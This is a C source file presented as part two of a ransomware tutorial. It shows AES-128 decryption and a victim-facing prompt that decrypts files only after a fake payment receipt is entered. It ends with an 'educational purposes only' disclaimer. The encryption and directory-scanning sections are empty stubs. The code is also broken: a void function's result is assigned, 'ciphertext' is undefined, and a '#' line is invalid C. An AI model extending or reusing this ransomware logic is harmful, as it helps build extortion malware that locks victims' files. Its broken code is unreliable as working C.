// Created July 23, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Windows [ gcc <path to file>\Ransomware_Example_In_C_Part_2.c -o 
// <path to file>\Ransomware_Example_In_C_Part_2.exe then run like any .exe ]
// This is Part 2 of the Ransomware program, it shows an example technique of file decryption and payment validation.
// There are also some more facts and things you should know about Ransomware

// As always we start with the import statements:
// stdio.h is for displaying the ransom message and in Part 2 for putting in the proof of payment
// string.h is for dealing with the data as holding it in strings is an easy way to encrypt it
// openssl/evp.h has cryptography functions for the encryption and in Part 2 the decryption
// dirent.h is used to access directories allowing us to cover every level of depth the data is stored in
#include <stdio.h>
#include <string.h>
#include <openssl/evp.h>
#include <dirent.h>

// Function to print the hex representation of data (Covered In Part 1)
void printHex(const unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}

// Function to perform AES encryption

// Function to perform AES decryption
void aesDecrypt(const unsigned char* ciphertext, int ciphertextLen, const unsigned char* key, unsigned char* decryptedtext) {
    EVP_CIPHER_CTX* ctx;  // Pointer to hold the encryption state ("context")
    int decryptedLen, len;  // Integer to hold length of the decrypted data

    ctx = EVP_CIPHER_CTX_new();  // New "context" for the ciphertext data structure
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);  // Function to initialize decryption in AES-128 bit context
    EVP_DecryptUpdate(ctx, decryptedtext, &len, ciphertext, ciphertextLen);  // Perform AES-128 decryption  of ciphertext
    decryptedLen = len;  // Store the length of the ciphertext obtained from the previous update operation into the ciphertextLen variable
    EVP_DecryptFinal_ex(ctx, decryptedtext + len, &len);  // Finalize the AES decryption process. The len variable will hold the length of the added ciphertext
    decryptedLen += len;  // Update the variable to add the length of the data from the finalization step
    EVP_CIPHER_CTX_free(ctx);  // Remember, always free memory spaces in C!
}

// Function to scan all files within a directory and its subdirectories

int main() {
    // Encryption key (128 bits / 16 bytes)
    unsigned char key[] = "ThisIsASecretKey";

    // AES Encryption

    // File Scanning Process

    // Validating payment and then decrypting the data
    unsigned char payment[128];  // String to hold the payment validation characters after you pay
    printf("\nEnter the payment receipt (Payment sent successfully): ");
    scanf("%s", payment);  // Here the user would type in the code they received after they paid

    if (strcmp(payment, "PaymentSent") == 0) {
        // Decryption of files
        unsigned char encryptedData[128];
        // This would typically be the encrypted data obtained from the victim's system
        // For example purposes, we use the same ciphertext generated earlier
        memcpy(encryptedData, ciphertext, sizeof(ciphertext));

        // Buffer to hold the decrypted data
        unsigned char decryptedData[128];

        // Decrypt the data with the function we made earlier
        int decryptedLen = aesDecrypt(encryptedData, sizeof(encryptedData), key, decryptedData);

        // Null-terminate the decrypted data to print as a string
        decryptedData[decryptedLen] = '\0';

        // Print the decrypted data
        printf("\nDecrypted Data: %s\n", decryptedData);
    } else {
        printf("Payment not validated. Files will not be decrypted.\n");  // If the payment isn't validated, the files are not decrypted
    }

    return 0;
}

# DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
